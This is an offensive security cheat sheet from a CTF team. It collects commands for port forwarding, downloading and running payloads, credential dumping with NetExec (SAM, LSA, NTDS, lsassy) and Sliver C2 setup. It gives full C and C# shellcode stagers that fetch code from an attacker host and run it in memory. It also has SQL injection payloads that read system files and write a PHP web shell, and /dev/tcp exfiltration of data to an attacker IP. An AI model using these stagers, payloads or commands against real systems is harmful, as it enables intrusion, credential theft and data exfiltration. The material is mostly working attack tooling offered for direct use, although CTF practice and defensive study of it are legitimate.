# 🄿🅄🅁🄿🄻🄴🅂🅃🄾🅁🄼 🅃🅃🄿🅂

A collection of commands, tools, techniques and procedures of the purplestorm ctf team.

## Table of Contents

- [Basics](#basics)
  - [Stabilizing Linux shell](#stabilizing-linux-shell)
  - [Port forwarding](#port-forwarding-1)
  - [Transfering files](#transfering-files)
- [Tooling](#tooling)
  - [Swaks](#swaks)
  - [Ligolo-ng](#ligolo-ng)
  - [NetExec](#netexec)
- [C2](#c2)
  - [Sliver](#sliver)
- [Databases](#databases)
  - [SQL Injection](#sql-injection)
- [Payloads](#payloads)
  - [Reverse Shell](#reverse-shell)
- [Exfiltrating Data](#exfiltrating-data)
- [Fixing SSH Problems](#fixing-ssh-problems)


## Basics

### Stabilizing Linux shell

```
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset
screen
```

### Port forwarding

#### SSH:

On kali:

```
ssh -N -L 80:localhost:80 user@10.10.10.10 -C
```

#### Chisel:

```
./chisel server -p 8000 --reverse #Server -- Attacker
./chisel client 10.10.16.3:8000 R:100:172.17.0.1:100 #Client -- Victim
```

#### Socat:

On victim:

```
socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
```

#### Netcat:

On victim:

```
nc -nlvp 8080 -c "nc localhost 1234"
```

## Transfering files

### Windows

cmd:

```
iwr -uri "http://10.10.10.10:8080/shell.exe" -outfile "shell.exe"

wget -O shell.exe 10.10.10.10:8000/shell.exe

certutil -urlcache -f  http://10.10.10.10:8000/shell.exe C:\inetpub\shell.exe
```

Powershell:

```
Invoke-WebRequest http://10.10.10.10:8000/shell.exe -OutFile shell.exe

powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.10.10:8000/shell.exe', 'shell.exe')"

powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/something.ps1')"
```

via SMB:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .    # On attacker

copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe    # On target
```

### Linux

```
wget http://10.10.10.10:8000/some.sh

curl -o some.sh http://10.10.10.10:8000/some.sh
```

via base64:

```
cat shell.sh | base64 -w 0   # On attacker
echo <base64encoded> | base64 -d > shell.sh   # On target
```
via scp:
```
scp some.sh user@10.10.10.10:/tmp/some.sh   # On attacker
```

## Tooling

### Swaks

- [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)

```console
swaks --server example.com --port 587 --auth-user "user@example.com" --auth-password "password" --to "user@target.com" --from ""user@example.com" --header "Subject: foobar" --body "\\\<LHOST>\x"
```

### Ligolo-ng

- [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

#### Prepare Tunnel Interface

```console
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```console
$ sudo ip link set ligolo up
```

#### Setup Proxy on Attacker Machine

```console
$ ./proxy -laddr <LHOST>:443 -selfcert
```

#### Setup Agent on Target Machine

```console
$ ./agent -connect <LHOST>:443 -ignore-cert
```

#### Configure Session

```console
ligolo-ng » session
```

```console
[Agent : user@target] » ifconfig
```

```console
$ sudo ip r add 172.16.1.0/24 dev ligolo
```

```console
[Agent : user@target] » start
```

#### Port Forwarding

```console
[Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

## NetExec

> https://github.com/Pennyw0rth/NetExec

```console
$ sudo apt-get install pipx git
$ pipx ensurepath
$ pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Installation via Poetry

```console
$ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
$ git clone https://github.com/Pennyw0rth/NetExec
$ cd NetExec
$ poetry install
$ poetry run NetExec
```

### Modules

```console
$ netexec ldap -L
$ netexec mysql -L
$ netexec smb -L
$ netexec ssh -L
$ netexec winrm -L
```

### Common Commands

```console
$ netexec smb <RHOST> -u '' -p '' --shares
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
$ netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'  | awk -F '\\' '{print $2}'
$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir "FOLDER"
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
$ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
$ netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
$ netexec ldap <RHOST> -u '' -p '' -M -user-desc
$ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
$ netexec ldap <RHOST> -u '' -p '' -M ldap-checker
$ netexec ldap <RHOST> -u '' -p '' -M veeam
$ netexec ldap <RHOST> -u '' -p '' -M maq
$ netexec ldap <RHOST> -u '' -p '' -M adcs
$ netexec ldap <RHOST> -u '' -p '' -M zerologon
$ netexec ldap <RHOST> -u '' -p '' -M petitpotam
$ netexec ldap <RHOST> -u '' -p '' -M nopac
$ netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
$ netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
$ netexec winrm <NETWORK>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
$ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
```

## C2

### Profiles

#### Session Profile

```sliver
profiles new --mtls 10.8.0.14:53 --skip-symbols --format shellcode --arch amd64 win64 
```

#### Beacon Profile

```sliver
profiles new beacon --mtls 10.8.0.14:53 --skip-symbols --format shellcode --arch amd64 win64-beacon
```

### Stager

Sliver can itself generate stagers, which are very small pieces of shellcode communicating with your stage listener. You may be able to deliver such shellcode with an exploit, or make it part of yet another program that just loads and executes it. The latter is what I’ll demonstrate below.

#### Generate Stager

Output format (msfvenom formats, see help generate stager for the list) (default: raw)

```sliver
generate stager --lhost 10.8.0.14 --lport 8443 --arch amd64 --format c --save /tmp
```
#### MSVenom Stager

```bash
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=10.8.0.14 LPORT=8443 LURI=/d3sty.woff -f raw -o /tmp/stager.bin
```
  
If you want to use stagers generated by the Metasploit Framework with Sliver (using msfconsole, msfvenom or the generate stager command), you will need to pass the additional --prepend-size flag to stage-listener, like this:  

```
stage-listener --url http://10.8.0.14:8443 --profile win64-beacon --prepend-size
```

#### Stage Runner C

```sliver
generate stager --lhost 10.8.0.14 --lport 8443 --arch amd64 --format c --save /tmp
```

```console
#include "windows.h"

int main()
{
    unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    ...
    "\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
    "\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff"
    "\xd5";


    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();

    return 0;
}
```

`x86_64-w64-mingw32-gcc -o runner.exe runner.c`

### Listener

Sliver staging listeners only accept `tcp://`, `http://` and `https://` schemes for the `--url` flag. The format for this flag is `scheme://IP:PORT`. If no value is specified for PORT, an error will be thrown out.

#### Encrypted Listener

```
stage-listener --url http://10.8.0.3:8443 --profile win64-beacon --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
```
#### Stage Listener Session

```sliver
stage-listener --url tcp://10.8.0.14:8443 --profile win64
```
#### Stage Listener Beacon

```sliver
stage-listener --url tcp://10.8.0.14:8443 --profile win64-beacon
```

### Custom Stager

#### Simple HTTP C Stager

```cpp
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment (lib, "Wininet.lib")


struct Shellcode {
  byte* data;
  DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port);
void Execute(Shellcode shellcode);

int main() {
  ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window

  Shellcode shellcode = Download(L"10.8.0.14", 8443);
  Execute(shellcode);

  return 0;
}

Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
  HINTERNET session = InternetOpen(
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    INTERNET_OPEN_TYPE_PRECONFIG,
    NULL,
    NULL,
    0);

  HINTERNET connection = InternetConnect(
    session,
    host,
    port,
    L"",
    L"",
    INTERNET_SERVICE_HTTP,
    0,
    0);

  HINTERNET request = HttpOpenRequest(
    connection,
    L"GET",
    L"/fontawesome.woff",
    NULL,
    NULL,
    NULL,
    0,
    0);

  WORD counter = 0;
  while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
    //printf("Error sending HTTP request: : (%lu)\n", GetLastError()); // only for debugging

    counter++;
    Sleep(3000);
    if (counter >= 3) {
      exit(0); // HTTP requests eventually failed
    }
  }

  DWORD bufSize = BUFSIZ;
  byte* buffer = new byte[bufSize];

  DWORD capacity = bufSize;
  byte* payload = (byte*)malloc(capacity);

  DWORD payloadSize = 0;

  while (true) {
    DWORD bytesRead;

    if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
      //printf("Error reading internet file : <%lu>\n", GetLastError()); // only for debugging
      exit(0);
    }

    if (bytesRead == 0) break;

    if (payloadSize + bytesRead > capacity) {
      capacity *= 2;
      byte* newPayload = (byte*)realloc(payload, capacity);
      payload = newPayload;
    }

    for (DWORD i = 0; i < bytesRead; i++) {
      payload[payloadSize++] = buffer[i];
    }
    
  }
  byte* newPayload = (byte*)realloc(payload, payloadSize);

  InternetCloseHandle(request);
  InternetCloseHandle(connection);
  InternetCloseHandle(session);

  struct Shellcode out;
  out.data = payload;
  out.len = payloadSize;
  return out;
}

void Execute(Shellcode shellcode) {
  void* exec = VirtualAlloc(0, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(exec, shellcode.data, shellcode.len);
  ((void(*)())exec)();
}
```

#### Simple HTTP C# Stager:

```cs
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Sliver_stager
{
    class Program
    {
        public static void Main(String[] args)
        {
            byte[] shellcode = Download("http://sliver.labnet.local/fontawesome.woff");
            Execute(shellcode);

            return;
        }

        private static byte[] Download(string url)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            return shellcode;
        }


        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        private static void Execute(byte[] shellcode)
        {
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(addr), shellcode.Length);
        
        
            IntPtr hThread = IntPtr.Zero;
            IntPtr threadId = IntPtr.Zero;
            hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, threadId);
        
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        
            return;
        }
    }
}
```

#### Encrypted C# Stager 

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Sliver_stager
{
    class Program
    {
        private static string AESKey = "D(G+KbPeShVmYq3t";
        private static string AESIV = "8y/B?E(G+KbPeShV";
        private static string url = "http://192.168.24.128:8443/test.woff";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            List<byte> l = new List<byte> { };

            for (int i = 16; i <= shellcode.Length -1; i++) {
                l.Add(shellcode[i]);
            }

            byte[] actual = l.ToArray();

            byte[] decrypted;

            decrypted = Decrypt(actual, AESKey, AESIV);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x3000, 0x40);
            Marshal.Copy(decrypted, 0, addr, decrypted.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        public static void Main(String[] args)
        {
            DownloadAndExecute();
        }
    }
}

```

#### Another Simple HTTP Stager

```cs
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace SliverStager
{
    public class Stager
    {
        private static string url = "http://a.bc/test.woff";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        public static void Main(String[] args)
        {
            DownloadAndExecute();
        }
    }
}

```

## Databases

### SQL Injection

#### References

- [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [https://cloudinvent.com/blog/backdoor-webserver-using-mysql-sql-injection/](https://cloudinvent.com/blog/backdoor-webserver-using-mysql-sql-injection/)
- [https://sechow.com/bricks/docs/login-1.html](https://sechow.com/bricks/docs/login-1.html)
    
#### MySQL

Login:

- `mysql -u user -h localhost -D database -p`

Skip Password: 

- `mysql -u user -h localhost -D database --password='passwd'`

Execute SQL Command:

- `mysql -u user -h localhost -D database --password='passwd' -e 'command'`

#### Enum commands

Privileges:

- `SHOW GRANTS FOR CURRENT_USER();`
- `SHOW GRANTS FOR 'root'@'localhost';`
- `SELECT * FROM mysql.user;`

All Databases:

- `SHOW DATABASES;`

Use Database:

- `USE databasename;`

All Tables:

- `SHOW TABLES;`

All data from table:

- `SELECT * FROM tablename;`
    
    For better output, add `\G` instead of `;` at the end.
    

All columns/infos from table:

- `describe tablename;`

# **Query**

---

Get Version:

- `version()`
- `@@version`

Current User:

- `user()`

Current DB:

- `database()`

User privileges:

- `SELECT super_priv FROM mysql.user`
- `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
- `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
- `UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- -`

All Databases:

- `group_concat(Schema_NAME,"\r\n") FROM Information_Schema.SCHEMATA`

All tables from DB:

- `group_concat(TABLE_NAME) FROM Information_Schema.TABLES WHERE TABLE_SCHEMA = 'db_name'`
- `UNION SELECT table_name,NULL,FROM information_schema.tables`

All columns for all tabels in database:

- `group_concat(COLUMN_NAME) FROM Information_Schema.COLUMNS WHERE TABLE_SCHEMA = 'db_name'`

Get table and column name at once:

- `group_concat(TABLE_NAME,' : ',COLUMN_NAME,'\r\n') FROM Information_Schema.COLUMNS WHERE TABLE_SCHEMA = 'db'`

All columns for one table:

- `group_concat(COLUMN_NAME) FROM Information_Schema.COLUMNS WHERE TABLE_SCHEMA = 'db_name' AND TABLE_NAME = 'table_name'`

Show Input from table:

- `group_concat(role,' : ',name,' : ',email,' : ',password,'\r\n') from users`

List Password Hashes:

- `SELECT host, user, password FROM mysql.user;`

#### Read Files

- `union select 1,2,3,LOAD_FILE('/etc/passwd')-- -`
- `Union Select TO_base64(LOAD_FILE("/var/www/html/index.php"))-- -`

#### Writing Files

Checking the `secure_file_priv` value, empty means we can read/write files:

- `UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
- `SELECT * from users INTO OUTFILE '/tmp/credentials';`
- `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`

PHP code:

- `union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

### Attack types

---

#### Union Select

Detect number of columns using `order by`

- `' order by 1-- -`

Detect number of columns using Union injection:

- `cn' UNION select 1,2,3-- -`
- `union select 1,2,3,version()-- -`

#### Error Based

MariaDB payloads:

- `and extractvalue(1,concat(0x7e,version()))-- -`
- `AND (extractvalue(1,concat(0x7e,version())))`
- `and updatexml(1,concat(0x0a,version()),null)-- -`
- `and (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a)-- -`

Get pieces from output:

- `and extractvalue(0,concat(0,(select (select mid(<colum_name>,1,99)) from <db_name>.<table_name> limit 0,1)))`

Or

- `and extractvalue(0,concat(0,substring((select <colum_name> from <db_name>.<table_name> limit 0,1) from 1)))`

`IudGPHd9pEKiee9MkJ7ggPD89q3Yn…` 

We got the first 32 chars from the output,because the function `extractvalue()` only return this length of a string!

- `echo -n 'IudGPHd9pEKiee9MkJ7ggPD89q3Y' | wc -c`

Now change the `index` to 1+29 = `30` (29 because the … is 3 and 32-3=29)

- `and extractvalue(0x7e,concat(0x7e,substring((select <colum_name> from <db_name>.<table_name> limit 0,1) from 30)))`

`ndctnPeRQOmS2PQ7QIrbJEomFVG6` and the next `index` is 1+29+29 = `59`

When you see less then 32 chars, the output is finised and you can set `limit 0,1` to `limit 1,1` and so on `limit 2,1`

#### Blind SQLi

5 sec to retrieve the response:

- `and sleep(5)#`

`length(database())=X` count up until the output

- `and length(database())=4#`

### MSSQL

---

Get Version:

- `-q "SELECT @@Version"`

Get Current Database:

- `-q "SELECT DB_NAME() AS [Current Database]"`

Get All Database Names:

- `-q "SELECT name FROM sys.databases"`
- `-q "Select name from sysdatabases"`
- `-q "SELECT name FROM master.dbo.sysdatabases"`

Get All Table Names:

- `-q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"`

Get All Content from Table:

- `-q "SELECT * from [core_app].[dbo].tbl_users"`

### SQLMAP

---

See request:

- `-v 4`

Prefix and Suffix:

- `--prefix="' union select 1," --suffix=',3-- -'`

Add script:

- `--tamper script.py`

Injection cookie:

```python
import urllib.parse

def tamper(payload, **kwargs):
    cookies = '{"x'+payload+'":"99"}'
    cookies = urllib.parse.quote(cookies)
    return cookies%
```

Injection in data parameter:

```python
import base64
import urllib.parse

def tamper(payload, **kwargs):
    params = 'name1=value1%s&name2=value2' % payload

    data = urllib.parse.quote(params)
    data = base64.b64encode(data)

    return data
```

## Payloads

### Reverse Shell

- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)

```
pip install pwncat-cs
Listener: pwncat-cs 192.168.1.1 4444
(To change from pwncat shell to local shell, use Ctrl+D)
```

## Exfiltrating Data

### Linux

#### via TCP socket, ebcdic and base64

On kali:

```
nc -nlvp 80 > datafolder.tmp
```

On target:

```
tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/10.10.10.10/80
```

On kali:

```
dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
tar xf datafolder.tar
```

#### via SSH

On target:

```
tar zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar zxpf -"
```

On kali:

```
cd /tmp/datafolder
```

### Windows

via SMB server:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username user -password pass share . -smb2support  # On kali
net use \\10.10.16.5\share /u:user pass   # On victim
copy C:\Users\user\Desktop\somefile.txt \\10.10.16.5\share\somefile.txt   # On victim
```

via pscp:

```
pscp Administrator@10.10.10.10:/Users/Administrator/Downloads/something.txt
```

## Fixing SSH Problems

### SSH Key Cleanup

Sometimes, exfiltrated SSH keys will cause ugly errors, such as `Load key "id_rsa": error in libcrypto`. This can often be corrected
with simple cleanup.

```bash
dos2unix id_rsa
vim --clean id_rsa
chmod 400 id_rsa

# One line version
dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 400 id_rsa
```

### RSA Problems

Newer versions of SSH might complain about RSA as such. This can be corrected by adding the following to `~/.ssh/config`.

```sh
HostKeyAlgorithms +ssh-rsa
PubkeyAcceptedAlgorithms +ssh-rsa
```
